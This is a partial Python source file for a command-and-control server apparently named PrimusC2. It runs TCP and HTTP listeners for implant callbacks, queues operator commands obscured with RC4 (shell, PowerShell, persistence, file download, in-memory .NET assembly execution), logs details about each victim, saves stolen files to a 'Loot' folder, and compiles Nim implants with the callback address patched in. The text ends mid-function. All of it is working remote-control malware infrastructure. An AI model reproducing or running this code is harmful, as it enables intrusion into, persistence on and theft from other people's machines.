import socket
import threading
from prettytable import PrettyTable
import time 
from datetime import datetime
import string, random, os
import os.path
import shutil
import subprocess
import fcntl
import struct
from http.server import HTTPServer, SimpleHTTPRequestHandler
import http.server
import base64
import randomname
from Cryptodome.PublicKey import RSA
import re
import atexit
from rich.progress import track
import secrets
import colorama
from colorama import Fore, Back, Style
import readline
from flask import Flask
from flask import request
from flask import jsonify
import logging
from flask import cli
from queue import Queue
from flask import abort
from flask import render_template, send_from_directory, send_file
import psutil
import sys
from halo import Halo
import textwrap
from werkzeug.utils import secure_filename

project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.append(project_root)

from utils import RC4Util
from utils.helpfunc import *
from utils.swnamegen import swnamegen

cwd = os.getcwd()
rc4 = RC4Util.RC4()
template_folder = os.path.expanduser(f'{cwd[:-3]}/Web_interface/')
static_folder = os.path.expanduser(f'{cwd[:-3]}/Web_interface/primus-gui/build/')
app = Flask(__name__, template_folder=template_folder, static_folder=static_folder)
internal_app = Flask(__name__, template_folder=template_folder, static_folder=static_folder)

def load_spinner():
    spinner = Halo(text='Provisioning and configuring the redirector, please wait. . .', spinner='dots')
    return spinner

spinner = load_spinner()

def banner():
    print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
    print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
    print('╩  ┴└─┴┴ ┴└─┘└─┘  ╚═╝')


task_queue = {}
listeners_overview =[]
results = {}


def listener_handler(): # Function to handle incoming connections and send bytes over the socket
    try:
        sock.bind((host_ip, int(host_port)))
    except (OSError):
        print(f'{Fore.RED}[-] Address already in use, please try another one')
    if listen_choice == "3":
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {re_ip_str}:{host_port} ')
    else:
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {host_ip}:{host_port}')
    
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.daemon = True
    t1.start()
    id = (''.join(random.choices(string.ascii_lowercase, k=4)))
    listeners_overview.append({'ID': id,'type': 'TCP', 'port': host_port, 'interface': host_ip, 'status': 'Running'})

def internal_interface():
    cli.show_server_banner = lambda *_: None
    flask_t = threading.Thread(target=lambda: internal_app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False))
    flask_t.daemon = True
    flask_t.start()
    print(f'{Fore.LIGHTYELLOW_EX}[*] Internal PrimusC2 webinterface started on http://127.0.0.1:5000')

    
def httpListenerHandler():
    global host_ip
    global http_host_ip
    global http_host_port
    cli.show_server_banner = lambda *_: None
    flask_t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(http_host_port), debug=False, use_reloader=False))
    flask_t.daemon = True
    id = (''.join(random.choices(string.ascii_lowercase, k=4)))
    flask_t.start()

    addrs = psutil.net_if_addrs()
    print(f'{Fore.CYAN}Interfaces on system:' + Fore.RESET)
    for interface in addrs.keys():
        print(f'>> {Fore.CYAN}{interface}' + Fore.RESET)
        completer.add_keyword(interface)
    while True:
        try:
            http_host_ip = resolve_ip(input(Fore.CYAN + '[#] Enter the interface to listen on: '+ Fore.RESET))
            break
        except:
            print(f'{Fore.RED}[-] No such interface found, please try again')
    print(f'{Fore.LIGHTYELLOW_EX}[*] HTTP listener started - Awaiting HTTP callbacks from implants on {http_host_ip}:{http_host_port}')
    listeners_overview.append({'ID': id,'type': 'HTTP', 'port': http_host_port, 'interface': http_host_ip, 'status': 'Running'})
    



def HttpRedirectorListenerHandler():
    global host_ip
    global redir_host_ip
    cli.show_server_banner = lambda *_: None
    flask_t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(80), debug=False, use_reloader=False))
    flask_t.daemon = True
    flask_t.start()
    id = (''.join(random.choices(string.ascii_lowercase, k=4)))
    

    redir_host_ip = resolve_ip("wg0")
    print(f'{Fore.LIGHTYELLOW_EX}[*] HTTP(S) redir started - Awaiting internal WG traffic from VPS on: {redir_host_ip}:80')
    listeners_overview.append({'ID': listen_id,'type': listen_type, 'port': 80, 'domain': domain,'interface':'wg0', 'status': 'Running'})



#############################################Flask Stuff#############################################
logging.getLogger('werkzeug').disabled = True


@internal_app.route('/', defaults={'path': ''})
@internal_app.route('/<path:path>')
def serve(path):
    if path != "" and os.path.exists(internal_app.static_folder + '/' + path):
        return send_from_directory(internal_app.static_folder, path)
    else:
        return send_from_directory(internal_app.static_folder, 'index.html')

@internal_app.route('/api/start-listener', methods=['POST'])
def start_listener():
    global host_ip
    global host_port
    global listener_count
    global http_host_port
    global http_interface
    global listen_type
    
    global domain
    global listen_id
    global http_host_ip
    listen_id = (''.join(random.choices(string.ascii_lowercase, k=4)))
    data = request.get_json()
    listener_type = data.get('listenerType')
    if listener_type == 'HTTP':
        http_host_port = data.get('port')
        http_interface = data.get('interface')
    interface = data.get('interface')
    host_port = data.get('port')
    domain = data.get('domain')


    if listener_type == 'HTTP':
        try:
            listen_type = 'HTTP'
            return_massage = 'HTTP Listener is now running'
            cli.show_server_banner = lambda *_: None
            flask_t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(http_host_port), debug=False, use_reloader=False))
            flask_t.daemon = True
            flask_t.name = listen_id
            flask_t.start()

            http_host_ip = resolve_ip(http_interface)
            print(f'{Fore.LIGHTYELLOW_EX}[*] HTTP listener started - Awaiting HTTP callbacks from implants on {http_host_ip}:{http_host_port}')
            listener_count +=1
            listeners_overview.append({'ID': listen_id,'type': listener_type, 'port': host_port, 'interface': http_interface, 'status': 'Running'})
        except:
            return_massage = 'An error occurred while starting the HTTP listener'
        
    if listener_type == 'TCP':
        try:
            listen_type = 'TCP'
            return_massage = 'TCP Listener is now running'
            host_ip = resolve_ip(interface)
            
            sock.bind((host_ip, int(host_port)))

    
            print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {host_ip}:{host_port}')
        
            sock.listen()
            t1 = threading.Thread(target=comm_handler)
            t1.daemon = True
            t1.start()
            listener_count +=1
            listeners_overview.append({'ID': listen_id,'type': listener_type, 'port': host_port, 'interface': interface, 'status': 'Running'})
        except:
            return_massage = 'An error occurred while starting the TCP listener'
    
    if listener_type == 'Redirector/HTTPS':
        try:
            listen_type = 'Redirector/HTTPS'
            return_massage = 'Redirector and listener is now running'
            redirector_http(domain)
            HttpRedirectorListenerHandler()
            listener_count +=1
        except:
            return_massage = 'An error occurred while provisioning the Redirector and starting the HTTPS listener'
    
    return jsonify({'message': f'{return_massage}'})

@internal_app.route('/api/interact', methods=['POST'])
def interact():
    data = request.get_json()
    command = data.get('command')
    num = data.get('target_id')
    global target_id
    target_id = (targets[int(num)])[1]

    if len(command) == 0:
        return jsonify({'message': 'No command provided'}), 400
    elif command == 'help':
        return jsonify({'message': help_implant_GUI()}), 200
    elif command == 'help callbacks':
        return jsonify({'message': callbacks_help()}), 200
    elif command == 'help pwsh':
        return jsonify({'message': pwsh_help()}), 200
    elif command == 'help shell':
        return jsonify({'message': shell_help()}), 200
    elif command == 'help cd':
        return jsonify({'message': cd_help()}), 200
    elif command == 'help ls':
        return jsonify({'message': ls_help()}), 200
    elif command == 'help pwd':
        return jsonify({'message': pwd_help()}), 200
    elif command == 'help exit':
        return jsonify({'message': exit_help()}), 200
    elif command == 'help sleep':
        return jsonify({'message': sleep_help()}), 200
    elif command == 'help persist':
        return jsonify({'message': persist_help()}), 200
    elif command == 'help pwsh_cradle':
        return jsonify({'message': pwsh_cradle_help()}), 200
    elif command == 'help GetAV':
        return jsonify({'message': GetAV_help()}), 200
    elif command == 'help download':
        return jsonify({'message': download_help()}), 200
    elif command == 'help background':
        return jsonify({'message': background_help()}), 200
    elif command == 'help execute-ASM':
        return jsonify({'message': execute_ASM_help()}), 200
    elif command == 'help payloads':
        return jsonify({'message': payloads_help()}), 200
    elif command == 'exit':
        add_task_UI(command, target_id)
        targets[int(num)][7] = 'Dead'
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'execute-ASM':
        args = list(command.split(" "))
        if len(args) > 0:
            CSharpToNimByteArray(args[1])
        else:
            return jsonify({'message': 'Please provide a file name as an argument.'}), 400
        try:
            with open(outfile, "r") as f:
                rub = f.read()
            size = os.stat(outfile).st_size
            if target_id not in task_queue:
                task_queue[target_id] = []
            command = rc4.obf(RCKey,command)
            rub = rc4.obf(RCKey,rub)
            task_queue[target_id].extend((command, rub))
        except:
            return jsonify({'message': 'An error occurred while executing the command'}), 500
    elif command == 'GetAV':
        add_task_UI(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'cd':
        add_task_UI(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command == 'pwd':
        add_task_UI(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'ls':
        add_task_UI(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'shell':
        add_task_UI(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'pwsh':
        add_task_UI(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command == 'payloads':
        return jsonify({'message': payload_list()}), 200
    elif command.split(" ")[0] == 'persist':
        add_task_UI(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'download':
        add_task_UI(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'sleep':
        add_task_UI(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    else:
        return jsonify({'message': 'Command not recognized'}), 400

    return jsonify({'message': 'Command added to task queue successfully'}), 200


@internal_app.route('/api/get_results', methods=['GET'])
def get_results():
    target_id = request.args.get('target_id')
    if target_id in results:
        result = base64.b64encode(results[target_id].encode()).decode()
        del results[target_id]
        return jsonify({'result': result}), 200
    else:
        return jsonify({'error': 'No results for this target_id'}), 400

@internal_app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    addrs = psutil.net_if_addrs()
    interfaces = list(addrs.keys())
    return jsonify(interfaces)

@internal_app.route('/api/listener-types', methods=['GET'])
def get_listener_types():
    listener_types = ['HTTP', 'Redirector/HTTPS', 'TCP']
    return jsonify(listener_types)

@internal_app.route('/api/callbacks', methods=['GET'])
def show_callbacks():
    try:
        session_counter = 0
        callbacks = []

        for target in targets:
            listen_type_cb = target[0] 
            if listen_type_cb == 'HTTP':
                callback = {
                    'id': str(session_counter) + " - " + target[1],
                    'username': target[4],
                    'admin': target[5],
                    'status': target[8],
                    'target': target[2],
                    'os': target[6],
                    'amsi': target[9],
                    'time': target[3]
                }
                callbacks.append(callback)
            elif listen_type_cb == 'TCP':
                callback = {
                    'id': str(session_counter) + " - " + target[4],
                    'username': target[4],
                    'admin': target[5],
                    'status': target[8],
                    'target': target[2],
                    'os': target[6],
                    'amsi': target[9],
                    'time': target[3]
            }
                callbacks.append(callback)
            session_counter += 1
        
        return jsonify(callbacks)
    except Exception as e:
        return jsonify({'error': str(e)}), 500



@internal_app.route('/api/listeners', methods=['GET'])
def show_listeners():
    return jsonify(listeners_overview)

@internal_app.route('/api/keywords', methods=['GET'])
def add_keywords():
    payload_keyword_add()
    return jsonify(keywords)

@internal_app.route('/api/upload', methods=['POST'])
def upload_file():
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    if 'file' not in request.files:
        return 'No file part', 400
    file = request.files['file']
    if file.filename == '':
        return 'No selected file', 400
    if file:
        filename = secure_filename(file.filename)
        file.save(os.path.join(payload_loc, filename))
        return 'File uploaded successfully', 200

@internal_app.route('/api/payloads', methods=['GET'])
def payloads():
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    payloads_avail = os.listdir(payload_loc)
    return jsonify(payloads_avail)

@internal_app.route('/api/compile-implant', methods=['POST'])
def compile_implant():
    data = request.get_json()
    listenerType = data['type']

    if listenerType == 'HTTP':
        return nimplant_HTTP("1", True)
    elif listenerType == 'TCP':
        return nimplant("1", True)
    elif listenerType == 'Redirector/HTTPS':
        return nimplant_HTTP("3", True)
    else:
        return 'Invalid listener type', 400

@app.route('/reg', methods=['POST'])
def register():
    
    # Access the data sent in the request
    data = request.get_json()

    # Extract the necessary information from the data
    
    key_validation = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'authKey')))
    if key_validation != auth_key:
        print(f'{Fore.RED}[-] An error occurred while registering the implant, likely due to incorrect key\n'+Fore.LIGHTYELLOW_EX +'Enter command#>', end="")
        return abort(403)
    id = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'id')))
    username = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'username')))
    os = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'os')))
    isadmin = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'isAdmin')))
    hostname = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'hostname')))
    publicIP = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'publicIP')))
    amsi = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'amsi')))
    if isadmin == "1":
        admin_value = 'Yes'
    else:
        admin_value = 'No'
    if 'windows' in os:
        pay_val = 1
    else:
        pay_val = 2
    
    if amsi == "0":
        amsi = 'Disabled'
    else:
        amsi = 'Running'
    
    task_queue[id] = []
    cur_time = time.strftime("%H:%M:%S",time.localtime())
    date = datetime.now()
    time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
    
    listen_type_check = "HTTP"
    if hostname is not None:
        targets.append([listen_type_check,id, f"{hostname}@{publicIP}", time_record, username, admin_value, os, pay_val,'Active',amsi]) #Appending info to targets list
        print(f'{Fore.GREEN}[+] Callback recieved from {hostname}@{publicIP}\n' +Fore.LIGHTYELLOW_EX +'Enter command#> ', end="")
        
    else: 
        targets.append([id, publicIP, time_record, username, admin_value, os, 'Active'])
        print(f'{Fore.LIGHTYELLOW_EX}[+] Callback recieved from {publicIP}\n' + Fore.LIGHTYELLOW_EX+'Enter command#> ', end="")
        # Return a response
        
    return '200'

@app.route('/tasks/<agent_id>', methods=['GET'])
async def serve_tasks(agent_id):
    try:
    # Check if the agent exists in the task queues
        if agent_id in task_queue:
            # Retrieve the tasks for the agent
            tasks = []
            while len(task_queue[agent_id]) > 0:
                tasks.append(task_queue[agent_id].pop(0))

            for target in targets:
                if target[1] == agent_id:
                    cur_time = time.strftime("%H:%M:%S",time.localtime())
                    date = datetime.now()
                    target[3] = (f'{date.day}/{date.month}/{date.year} {cur_time}')
                    break
            # Return the tasks as a JSON response
            return jsonify(tasks)
        else:
            return '404'
    except:
        print(f'{Fore.RED}[-] An error occurred while serving tasks to the implant')
        pass

@app.route('/result', methods=['POST'])
async def send_results():
    
    if request.headers.get('X-Upload') == 'true':
        try:
            data = request.get_json()
            agent_id = data[rc4.obf(RCKey,'id')]
            agent_id = rc4.deobf(RCKey,agent_id)
            print(f'Result from implant ID: {agent_id}')
            result = data[rc4.obf(RCKey,'data')]
            result = rc4.deobf(RCKey, result)
            filename = data[rc4.obf(RCKey,'filename')]
            filename = rc4.deobf(RCKey, filename)

            cwd_payload = os.getcwd()
            loot_loc = os.path.expanduser(f'{cwd_payload}/Loot')

            with open(f"{loot_loc}/{filename}", "w") as f:
                f.write(result)
            print(f'{Fore.GREEN}[+] File saved to loot directory at: {loot_loc}/{filename}')
            print(f'{Fore.LIGHTYELLOW_EX}{targets[num][3]}/{targets[num][1]}#>', end="")
        except:
            print(f'{Fore.RED}[-] An error occurred while receiving the file from the implant(likely due to encoding issues)')
            pass
    else:
    # Access the data sent in the request
        try:
            data = request.get_json()
            # Extract the necessary information from the data
            agent_id = data[rc4.obf(RCKey,'id')]
            agent_id = rc4.deobf(RCKey,agent_id)
            print(f'Result from implant ID: {agent_id}')
            result = data[rc4.obf(RCKey,'data')]
            result = rc4.deobf(RCKey, result)


            # Update the task in the task queue
            if agent_id in task_queue:
                if len(task_queue[agent_id]) > 0:
                    task_queue[agent_id].pop(0)  # Remove the completed task from the queue

            
            print(f'\n{Fore.LIGHTYELLOW_EX}Response received from task:{Fore.RESET}\n{result}\n{Fore.LIGHTWHITE_EX}{Fore.LIGHTWHITE_EX}{{{target_id}}}#> ', end="")
            formatted_result = f'\nResponse received from task:\n{result}\n'
            
            results[target_id] = formatted_result
            
            directory = os.getcwd()
            cleandir = os.listdir( directory )
            for item in cleandir:
                if item.endswith("NimByteArray.txt"):
                    os.remove( os.path.join( directory, item ) )
        except:
            print(f'{Fore.RED}[-] An error occurred while receiving the data from the implant(likely due to encoding issues)')
            pass


    return '200'

def add_task(command):
    if target_id not in task_queue:
        task_queue[target_id] = []
    task_queue[target_id].append(rc4.obf(RCKey,command))

def add_task_UI(command, target_id):
    if target_id not in task_queue:
        task_queue[target_id] = []
    task_queue[target_id].append(rc4.obf(RCKey,command))


def kill_http(target_id, command):
    add_task(command)
    add_task_UI(command, target_id)
    targets[num][8] = Fore.RED + 'Dead' + Fore.RESET
    

def http_target_comm(target_id, targets, num, task_queue):
    while True:
        command = input(f'{Fore.LIGHTWHITE_EX}{{{target_id}}}#> ') 
        if len(command) == 0:
            continue
        elif command == 'help':
            help_implant()
        elif command == 'help callbacks':
            callbacks_help()
        elif command == 'help pwsh':
            pwsh_help()
        elif command == 'help shell':
            shell_help()
        elif command == 'help cd':
            cd_help()
        elif command == 'help ls':
            ls_help()
        elif command == 'help pwd':
            pwd_help()
        elif command == 'help exit':
            exit_help()
        elif command == 'help sleep':
            sleep_help()
        elif command == 'help persist':
            persist_help()
        elif command == 'help pwsh_cradle':
            pwsh_cradle_help()
        elif command == 'help GetAV':
            GetAV_help()
        elif command == 'help download':
            download_help()
        elif command == 'help background':
            background_help()
        elif command == 'help execute-ASM':
            execute_ASM_help()
        elif command == 'help payloads':
            payloads_help()
        
        elif command == 'exit':
            add_task(command)
            targets[num][8] = Fore.RED + 'Dead' + Fore.RESET
            break

        elif command == 'background':
            break

        elif command.split(" ")[0] == 'execute-ASM':
            global outfile
            args = list(command.split(" "))
            if len(args) > 0:
                CSharpToNimByteArray(args[1])
            else:
                print(Fore.LIGHTYELLOW_EX + "Please provide a file name as an argument.")
                return                
            try:
                with open(outfile, "r") as f:
                    rub = f.read()
                size = os.stat(outfile).st_size
                print(f'{Fore.LIGHTYELLOW_EX}[*] Size of asm is: {size}')
                if target_id not in task_queue:
                    task_queue[target_id] = []
                command = rc4.obf(RCKey,command)
                rub = rc4.obf(RCKey,rub)
                task_queue[target_id].extend((command, rub))
            except:
                pass
        elif command == 'GetAV':
            add_task(command)
        elif command.split(" ")[0] == 'cd':
            add_task(command)
        elif command == 'pwd':
            add_task(command)
        elif command.split(" ")[0] == 'ls':
            add_task(command)
        elif command.split(" ")[0] == 'shell':
            add_task(command)
        elif command.split(" ")[0] == 'pwsh':
            add_task(command)
        elif command == 'payloads':
            payload_list()
        elif command.split(" ")[0] == 'persist':
            add_task(command)
        elif command.split(" ")[0] == 'download':
            add_task(command)
        elif command.split(" ")[0] == 'sleep':
            add_task(command)

            
        else:
            print(f'{Fore.LIGHTYELLOW_EX}[*] Command not recognized')

    
def fix_base64_padding(base64_string):
    # Calculate the number of padding characters needed
    missing_padding = len(base64_string) % 4
    # Add the necessary padding
    if missing_padding:
        base64_string += b'=' * (4 - missing_padding)
    return base64_string

def comm_in(target_id):
    try:
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting response...')

        size_data = target_id.recv(1024).decode()
        print(f'{Fore.LIGHTYELLOW_EX}[*] Size of response is: {size_data}')
        size = int(size_data.strip())

        # Receive the entire message
        output = b""
        while len(output) < size:
            chunk = target_id.recv(1024)
            if not chunk:
                break
            output += chunk
        output1 = fix_base64_padding(output)
        decoded_output = base64.urlsafe_b64decode(output1)
        result = decoded_output.decode().strip() + '\n'

        # Clear the buffer before returning
        target_id.recv(1024)
        return result
    except:
        print(f'{Fore.RED}[-] An error occurred while receiving data from the target')
        pass

def comm_out(target_id, message):
    message = str(message + '\n')
    target_id.send(message.encode())
    

def kill_signal(target_id, message):
    message = str(message)
    target_id.send(message.encode())

def target_comm(target_id, targets, num):
    while True:
        message = input(f'{Fore.LIGHTWHITE_EX}{targets[num][4]}/{targets[num][2]}#> ') + '\n'
        if len(message) == 0:
            continue
        if message == 'help':
            help_implant()
            
        else:
            comm_out(target_id, message)
            if message == 'exit\n':
                target_id.send(message.encode())
                target_id.close()
                targets[num][7] = Fore.RED + 'Dead' + Fore.RESET
                break
            if message == 'background\n':
                break

            if message == 'help\n':
                help_implant()
            
            if message == 'payloads':
                payload_list()
           
             
            if message == 'GetAV':
                pass

            if message.split(" ")[0] == 'execute-ASM':
                #sendasm(message)
                global outfile
                args = list(message.split(" "))
                if len(args) > 0:
                    CSharpToNimByteArray(args[1])
                else:
                    print(Fore.LIGHTYELLOW_EX + "Please provide a file name as an argument.")
                    return                

                with open(outfile, "r") as f:
                    rub = f.read()
                size = os.stat(outfile).st_size
                print(f'{Fore.LIGHTYELLOW_EX}[*] Size of asm is: {size}')
                size1 = str(size)
                comm_out(target_id, size1)
                print(Fore.GREEN + "[+] Sent asm size to client")
                rub = str(rub) + "\n"
                target_id.send(rub.encode())
                print(Fore.GREEN + "[+] Sent asm to client")
                os.remove(outfile)
                response = comm_in(target_id)
                print(response)
                
                
            else:
                response = comm_in(target_id)
                if response == 'exit':
                    print(Fore.RED + '[-] The client has terminated the session')
                    target_id.close()
                    break
                print(response)


def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            key_validation = remote_target.recv(4096).decode()
            key_validation = base64.b64decode(key_validation).decode()
            if key_validation == auth_key:
                username = remote_target.recv(4096).decode()
                username = base64.b64decode(username).decode()
                admin = remote_target.recv(4096).decode()
                admin = base64.b64decode(admin).decode()
                operating_system = remote_target.recv(4096).decode()
                operating_system = base64.b64decode(operating_system).decode()
                host_name = remote_target.recv(4096).decode()
                host_name = base64.b64decode(host_name).decode()
                public_ip = remote_target.recv(4096).decode()
                public_ip = base64.b64decode(public_ip).decode()
                if admin == "1":
                    admin_value = 'Yes'
                elif username == 'root':
                    admin_value = 'Yes'
                else:
                    admin_value = 'No'
                if 'windows' in operating_system:
                    pay_val = 1
                else:
                    pay_val = 2
                amsi_tcp = "N/A"
                cur_time = time.strftime("%H:%M:%S",time.localtime())
                date = datetime.now()
                time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')


                listen_type_check = "TCP"
                if host_name is not None:
                    targets.append([listen_type_check,remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active', amsi_tcp]) #Appending info to targets list
                    print(f'{Fore.GREEN}[+] Callback recieved from {host_name}@{public_ip}\n' +Fore.LIGHTYELLOW_EX +'Enter command#> ', end="")
                else: 
                    targets.append([remote_target, remote_ip[0], time_record, username, admin_value, operating_system, 'Active'])
                    print(f'{Fore.LIGHTYELLOW_EX}[+] Callback recieved from {remote_ip[0]}\n' + Fore.LIGHTYELLOW_EX+'Enter command#> ', end="")
            else:
                remote_target.close()
        except:
            pass


def clean_up_compile_tmp(f_name):
    cwd_nim = os.getcwd()
    template_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant')
    os.remove(f'{template_loc}/{f_name}')

def nimplant(imp_choice=None, GUI=False):
    global host_ip
    global host_port
    random_name = randomname.get_name()
    compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    cwd_nim = os.getcwd()
    f_name= f'{compile_name}.nim'
    exe_file = f'{random_name}.exe'
    
    file_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant.nim')
    implant_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant')
    final_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')

    if os.path.exists(file_loc):
        shutil.copy(file_loc, f_name)
        shutil.move(f_name, implant_loc)
    else:
        print(f'{Fore.RED}[-] implant.nim not found in {file_loc}')

    if imp_choice == None:
        print(Fore.CYAN + '[*] Use listener address or specify other IP for implant to connect to: ')
        print(Fore.CYAN + '[*] 1. Listener address')
        print(Fore.CYAN + '[*] 2. Other IP')
        imp_choice = input(Fore.LIGHTYELLOW_EX + '[#] Enter 1 or 2: ' + Fore.RESET)
    if imp_choice == "1":
        pass
    else:
        host_ip = input('[*] Specify IP: ')
    with open(f'{implant_loc}/{f_name}') as f:
        patch_host = f.read().replace('INPUT_IP', str(host_ip.strip()))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_host)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        patch_port = f.read().replace('INPUT_PORT', str(host_port))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_port)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        new_key = f.read().replace('AUTH_KEY', auth_key)
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(new_key)
        f.close()
    if GUI == False:
        compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
        for _ in track(range(4), description=f'[green][*] Compiling executeable {exe_file}...'):
            process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            process.wait()
        implant_loc = os.path.join(final_loc, exe_file)
        if os.path.exists(implant_loc):

            clean_up_compile_tmp(f_name)
            print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')
        else:
            output = process.stdout.read()
            print(output.decode('utf-8'))
            clean_up_compile_tmp(f_name)
            print(Fore.RED + '[-] An error occurred while compiling the implant')
    elif GUI == True:
        try:
            compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
            process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            process.wait()
        except Exception as e:
            clean_up_compile_tmp(f_name)
            return jsonify({'error': str(e)}), 500

        implant_loc = os.path.join(final_loc, exe_file)
        if os.path.exists(implant_loc):
            clean_up_compile_tmp(f_name)

            return send_file(implant_loc, as_attachment=True, download_name=exe_file)
        else:
            output = process.stdout.read()
            clean_up_compile_tmp(f_name)
            return jsonify({'An error occurred while compiling the implant': output.decode('utf-8')}), 500
    

def nimplant_HTTP(imp_choice=None, GUI=False):
    global host_ip
    global host_port
    global http_host_port
    global http_host_ip
    random_name = randomname.get_name()
    compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    cwd_nim = os.getcwd()
    f_name= f'{compile_name}.nim'
    exe_file = f'{random_name}.exe'
    
    
    

    file_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant_HTTP.nim')
    https_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant_HTTPS.nim')
    implant_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant')
    final_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')

    if imp_choice == None:
        print(Fore.CYAN + '[*] Use listener address or specify other IP for implant to connect to: ')
        print(Fore.CYAN + '[*] 1. Listener address')
        print(Fore.CYAN + '[*] 2. Other IP')
        print(Fore.CYAN + '[*] 3. Redirector')
        imp_choice = input(Fore.LIGHTYELLOW_EX + '[#] Enter 1, 2 or 3: ' + Fore.RESET)

    
    if imp_choice == "1":
        if os.path.exists(file_loc):
            shutil.copy(file_loc, f_name)
            shutil.move(f_name, implant_loc)

            URL = f'{http_host_ip}:{http_host_port}'  
            with open(f'{implant_loc}/{f_name}') as f:
                patch_host = f.read().replace('URL', str(URL.strip())) 
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(patch_host)
                f.close()
            with open(f'{implant_loc}/{f_name}') as f:
                new_key = f.read().replace('AUTH_KEY', auth_key)
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(new_key)
                f.close()
            with open(f'{implant_loc}/{f_name}') as f:
                RC_patch = f.read().replace('RCKEY', RCKey)
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(RC_patch)
                f.close()
            if GUI == False:
                compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
                for _ in track(range(4), description=f'[green][*] Compiling executable {exe_file}...'):
                    process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    process.wait()
                implant_loc = os.path.join(final_loc, exe_file)
                if os.path.exists(implant_loc):

                    clean_up_compile_tmp(f_name)

                    print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')
                else:
                    output = process.stdout.read()
                    print(output.decode('utf-8'))
                    print(Fore.RED + '[-] An error occurred while compiling the implant')
            elif GUI == True:
                try:
                    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
                    process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    process.wait()
                except Exception as e:
                    clean_up_compile_tmp(f_name)
                    return jsonify({'error': str(e)}), 500

                implant_loc = os.path.join(final_loc, exe_file)
                if os.path.exists(implant_loc):
                    
                    clean_up_compile_tmp(f_name)

                    return send_file(implant_loc, as_attachment=True, download_name=exe_file)
                else:
                    output = process.stdout.read()
                    clean_up_compile_tmp(f_name)
                    return jsonify({'An error occurred while compiling the implant': output.decode('utf-8')}), 500
            



    elif imp_choice == "3":
        if os.path.exists(https_loc):
            shutil.copy(https_loc, f_name)
            shutil.move(f_name, implant_loc)
        else:
